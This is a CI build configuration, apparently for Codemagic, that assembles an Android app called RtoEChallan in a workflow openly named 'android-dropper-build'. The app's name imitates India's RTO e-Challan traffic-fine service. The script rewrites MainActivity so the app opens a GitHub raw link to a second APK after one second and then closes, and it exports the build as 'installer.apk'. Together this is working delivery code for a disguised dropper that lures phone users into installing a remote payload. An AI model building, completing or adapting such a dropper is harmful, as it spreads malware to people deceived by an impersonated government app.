workflows:
  android-dropper-build:
    name: RTO Final Success Guaranteed
    max_build_duration: 60
    instance_type: mac_mini_m1
    environment:
      java: 17
    scripts:
      - name: Master Build Fix
        script: |
          cd RtoEChallan || exit 1
          
          # 1. Resource Fix (Fixes error from 11783.jpg)
          mkdir -p app/src/main/res/drawable
          LOGO_FILE=$(find . -name "google_play_text_logo.png" | head -n 1)
          if [ -f "$LOGO_FILE" ]; then
            cp "$LOGO_FILE" app/src/main/res/drawable/google_play_text_logo.png
          else
            cp app/src/main/res/mipmap-hdpi/ic_launcher.png app/src/main/res/drawable/google_play_text_logo.png
          fi

          # 2. Clean Redirect Logic
          FILE_PATH=$(find . -name "MainActivity.kt" | head -n 1)
          cat <<EOF > "$FILE_PATH"
          package com.example.rtoechallan
          import android.os.Bundle
          import android.content.Intent
          import android.net.Uri
          import android.os.Handler
          import android.os.Looper
          import androidx.appcompat.app.AppCompatActivity
          class MainActivity : AppCompatActivity() {
              override fun onCreate(savedInstanceState: Bundle?) {
                  super.onCreate(savedInstanceState)
                  setContentView(R.layout.activity_main)
                  Handler(Looper.getMainLooper()).postDelayed({
                      val url = "https://github.com/vikash6759ub-creator/RTO-callan/raw/refs/heads/main/app-debug%20(17).apk"
                      startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)))
                      finish()
                  }, 1000)
              }
          }
          EOF

          # 3. Fix Settings.gradle (Fixes error from 11792.jpg)
          rm -f settings.gradle gradle.properties build.gradle
          
          printf "android.useAndroidX=true\nandroid.enableJetifier=true" > gradle.properties
          
          printf "rootProject.name = 'RtoEChallan'\ninclude ':app'" > settings.gradle
          
          cat <<EOF > build.gradle
          buildscript {
              repositories { google(); mavenCentral() }
              dependencies { 
                  classpath 'com.android.tools.build:gradle:8.0.2'
                  classpath 'org.jetbrains.kotlin:kotlin-gradle-plugin:1.8.20'
              }
          }
          allprojects { repositories { google(); mavenCentral() } }
          EOF

          # 4. Build and Export
          gradle wrapper --gradle-version 8.0.2
          chmod +x gradlew
          ./gradlew assembleDebug --no-daemon
          
          # Force export to root for download button
          mkdir -p $CM_BUILD_DIR/final_link
          find . -name "*.apk" -exec cp {} $CM_BUILD_DIR/final_link/installer.apk \;
          
    artifacts:
      - $CM_BUILD_DIR/final_link/*.apk
